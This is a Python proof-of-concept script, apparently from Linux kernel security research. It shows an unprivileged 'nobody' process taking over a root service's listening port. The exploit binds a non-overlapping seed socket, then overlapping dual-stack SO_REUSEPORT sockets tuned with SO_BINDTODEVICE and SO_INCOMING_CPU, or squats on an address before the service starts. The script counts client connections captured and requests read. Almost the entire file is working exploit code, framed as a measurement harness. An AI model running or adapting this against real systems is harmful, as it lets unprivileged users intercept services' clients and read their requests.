#!/usr/bin/env python3
"""Take a running service's address and port as an unprivileged user.

Run as root on the booted kernel; the attacker runs as nobody in a forked
child, with no capabilities, no namespace of its own and no passed socket.

  usage: attack.py OUTDIR [SERVICE...]

Every service of services.py is attacked three times: as it binds in
2-reachability, once with a single dual-stack hijacking socket and once with
one per CPU that also binds the interface the traffic arrives on, and then
pinned to an interface as a VRF would. A service that carries on when one of
its binds fails is also attacked by holding one family's address before it
starts. Each run first makes the same hijacking bind on its own, without the
seed socket: that control must be refused, or the run would show nothing.
Then clients probe the service's address with the service's own protocol and
count who answered, and finally, while the attacker still holds the port,
the service is stopped and started again.

Writes OUTDIR/attack.txt, one line per run and client address.
"""

import errno
import os
import pwd
import selectors
import socket
import subprocess
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import services                                            # noqa: E402

SO_REUSEPORT = getattr(socket, "SO_REUSEPORT", 15)
SO_BINDTOIFINDEX = getattr(socket, "SO_BINDTOIFINDEX", 62)
SO_INCOMING_CPU = getattr(socket, "SO_INCOMING_CPU", 49)
NOBODY = pwd.getpwnam("nobody")
HERE = os.path.dirname(os.path.abspath(__file__))
MARKER = b"ATTACKER"
PROBES = 50
PORT = 19200


def errname(e):
    return errno.errorcode.get(e.errno, str(e.errno))


def unused_ifindex():
    used = set()
    for d in os.listdir("/sys/class/net"):
        try:
            with open("/sys/class/net/%s/ifindex" % d) as f:
                used.add(int(f.read().strip()))
        except OSError:
            pass
    i = 4242
    while i in used:
        i += 1
    return i


def seed_socket(axis, port):
    """A socket that genuinely does not overlap the service, so the full
    conflict check admits it and it becomes the port's cached socket."""
    if axis == "device":
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, SO_REUSEPORT, 1)
        # SO_BINDTOIFINDEX does not check that the interface exists and, on a
        # socket that has no device yet, needs no capability.
        s.setsockopt(socket.SOL_SOCKET, SO_BINDTOIFINDEX, unused_ifindex())
        s.bind(("0.0.0.0", port))
        return s
    s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
    s.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, 1)
    s.setsockopt(socket.SOL_SOCKET, SO_REUSEPORT, 1)
    s.bind(("::", port))
    return s


def hijack_sockets(axis, port):
    """The sockets that do overlap the service, which the summary must not
    vouch for, with the address each binds.

    "v6only" is one dual-stack socket. It covers the service's IPv4 address,
    but in the listener lookup it only ties with an IPv4 service and loses
    on its place in the hash chain, so it takes only the family the service
    leaves empty. "v6only-cpu" is the same socket once per CPU, each also
    bound to the interface the clients' traffic arrives on and carrying
    SO_INCOMING_CPU: both raise its score above a service that has neither,
    which is how an attacker takes the service's own IPv4 clients too.
    Neither option needs a capability on a socket that has no device yet."""
    if axis == "device":
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, SO_REUSEPORT, 1)
        return [(s, ("127.0.0.1", port))]
    cpus = range(os.cpu_count()) if axis == "v6only-cpu" else [None]
    out = []
    for cpu in cpus:
        s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
        s.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, 0)
        s.setsockopt(socket.SOL_SOCKET, SO_REUSEPORT, 1)
        if cpu is not None:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, b"lo")
            s.setsockopt(socket.SOL_SOCKET, SO_INCOMING_CPU, cpu)
        out.append((s, ("::", port)))
    return out


def squat_socket(port):
    """Held before the service starts: an ordinary bind of the service's
    IPv6 loopback address, which nothing holds yet, so any user may make it.
    A service that binds [::] then fails that bind."""
    s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
    s.bind(("::1", port))
    return s


def attacker(axis, port, rfd, wfd, gofd=None, opening=b""):
    os.setgroups([])
    os.setgid(NOBODY.pw_gid)
    os.setuid(NOBODY.pw_uid)
    out, stop = os.fdopen(wfd, "w"), os.fdopen(rfd)

    if gofd is not None:
        # Hold one family's address until the service has started, then let
        # it go: the service has carried on without that family by then.
        try:
            squat = squat_socket(port)
            out.write("squat succeeded\n")
        except OSError as e:
            squat = None
            out.write("squat %s\n" % errname(e))
        out.flush()
        os.read(gofd, 1)
        if squat:
            squat.close()

    socks = hijack_sockets(axis, port)
    control, addr = socks[0]
    try:
        control.bind(addr)
        out.write("control admitted\n")
    except OSError as e:
        out.write("control %s\n" % errname(e))
    for s, _ in socks:
        s.close()

    try:
        seed = seed_socket(axis, port)
    except OSError as e:
        out.write("seed %s\nbind not_attempted\n" % errname(e))
        out.flush()
        os._exit(0)
    out.write("seed succeeded\n")
    hijacks = []
    try:
        for hijack, addr in hijack_sockets(axis, port):
            hijack.bind(addr)
            hijack.listen(128)
            hijacks.append(hijack)
    except OSError as e:
        out.write("bind %s\n" % errname(e))
        out.flush()
        os._exit(0)
    out.write("bind succeeded\n")
    out.flush()

    sel = selectors.DefaultSelector()
    for hijack in hijacks:
        sel.register(hijack, selectors.EVENT_READ)
    sel.register(stop, selectors.EVENT_READ)
    served, running = 0, True
    # Connections in which the attacker received the client's whole request,
    # by the client's family: what it reads, not only what it answers.
    read = {"4": 0, "6": 0}
    while running:
        for key, _ in sel.select(timeout=60):
            if key.fileobj is stop:
                running = False         # the parent closed the pipe
                continue
            conn, _ = key.fileobj.accept()
            local = conn.getsockname()[0]
            family = "4" if "." in local else "6"   # ::ffff:a.b.c.d is IPv4
            # Answer at once, whatever the protocol, then let the client
            # close first so the port is left with nothing in TIME_WAIT.
            got = b""
            try:
                conn.sendall(MARKER + b"\n")
                conn.settimeout(2)
                while True:
                    chunk = conn.recv(400)
                    if not chunk:
                        break
                    got += chunk
            except OSError:
                pass
            conn.close()
            served += 1
            if opening and got.startswith(opening):
                read[family] += 1
    out.write("served %d read4 %d read6 %d\n" % (served, read["4"], read["6"]))
    out.flush()
    os._exit(0)


def probe(family, addr, port, opening):
    """One request in the service's own protocol: who answered it?"""
    try:
        s = socket.socket(family, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((addr, port))
        if opening:
            s.sendall(opening)
        answer = s.recv(400)
        s.close()
    except OSError:
        return "error"
    if MARKER in answer:
        return "attacker"
    return "service" if answer else "error"


def clients(family, addr, port, opening):
    counts = {"service": 0, "attacker": 0, "error": 0}
    for _ in range(PROBES):
        counts[probe(family, addr, port, opening)] += 1
    return counts


def run(service, axis, targets, port, squat=False):
    # The attacker starts at once, so the service has to be up first, except
    # when the attacker's first step is to hold an address before it starts.
    if not squat:
        service.start()
        listening = services.listeners(port)
    r1, w1 = os.pipe()
    r2, w2 = os.pipe()
    rgo, wgo = os.pipe() if squat else (None, None)
    pid = os.fork()
    if pid == 0:
        os.close(w1)
        os.close(r2)
        if squat:
            os.close(wgo)
        attacker(axis, port, r1, w2, rgo, service.probe)
    os.close(r1)
    os.close(w2)
    stop, from_child = os.fdopen(w1, "w"), os.fdopen(r2)
    held = "no"
    if squat:
        os.close(rgo)
        held = from_child.readline().split()[1]
        service.start()
        listening = services.listeners(port)
        os.write(wgo, b"g")
        os.close(wgo)

    control = from_child.readline().split()[1]
    seed = from_child.readline().split()[1]
    bind = from_child.readline().split(None, 1)[1].strip()
    counted = [(addr, clients(family, addr, port, service.probe))
               for family, addr in targets]

    service.stop()
    restart = service.restart()         # the attacker still holds the port

    stop.close()
    read = {"4": 0, "6": 0}
    if bind == "succeeded":
        w = from_child.readline().split()
        read = {"4": int(w[3]), "6": int(w[5])}
    os.waitpid(pid, 0)
    return ["service=%s config=%s listening=%s pinned=%s axis=%s squat=%s "
            "target=%s control=%s seed=%s bind=%s answered_service=%d "
            "answered_attacker=%d errors=%d attacker_read=%d restart=%s"
            % (service.name.replace(" ", "_"), service.config, listening,
               service.pin or "no", axis, held, addr, control, seed, bind,
               c["service"], c["attacker"], c["error"],
               read["6" if ":" in addr else "4"], restart.replace(" ", "_"))
            for addr, c in counted]


V4 = [(socket.AF_INET, "127.0.0.1")]
BOTH = [(socket.AF_INET6, "::1"), (socket.AF_INET, "127.0.0.1")]


def main():
    if os.getuid() != 0:
        sys.exit("run as root: the services run as root")
    outdir = sys.argv[1]
    wanted = [w.lower() for w in sys.argv[2:]]
    os.makedirs(outdir, exist_ok=True)
    services.setup_addresses()
    os.makedirs(services.TMP, exist_ok=True)
    os.chmod(services.TMP, 0o755)
    subprocess.run(["gcc", "-shared", "-fPIC", "-o", services.SHIM,
                    os.path.join(HERE, "pin-to-device.c"), "-ldl"], check=True)
    os.chmod(services.SHIM, 0o755)

    lines, port = ["kernel %s" % os.uname().release], PORT
    for cls, config, _ in services.CATALOGUE:
        if wanted and cls.name.lower() not in wanted:
            continue
        # As it binds in 2-reachability, with one hijacking socket and then
        # with one per CPU on the clients' interface, then pinned to an
        # interface. A service that carries on after a failed bind is also
        # attacked by holding its IPv6 address before it starts.
        runs = [(None, "v6only", BOTH, False),
                (None, "v6only-cpu", BOTH, False),
                ("lo", "device", V4, False)]
        if getattr(cls, "carries_on", False) and config in cls.carries_on:
            runs.append((None, "v6only-cpu", BOTH, True))
        for pin, axis, targets, squat in runs:
            service = cls(port, config, pin)
            try:
                for line in run(service, axis, targets, port, squat):
                    lines.append(line)
                    print(line)
            except Exception as e:
                lines.append("service=%s config=%s pinned=%s axis=%s squat=%s "
                             "FAILED %s" % (cls.name.replace(" ", "_"), config,
                                            pin or "no", axis,
                                            "yes" if squat else "no", e))
                print(lines[-1])
            finally:
                service.stop()
            port += 1
    with open(os.path.join(outdir, "attack.txt"), "w") as f:
        f.write("\n".join(lines) + "\n")


if __name__ == "__main__":
    main()
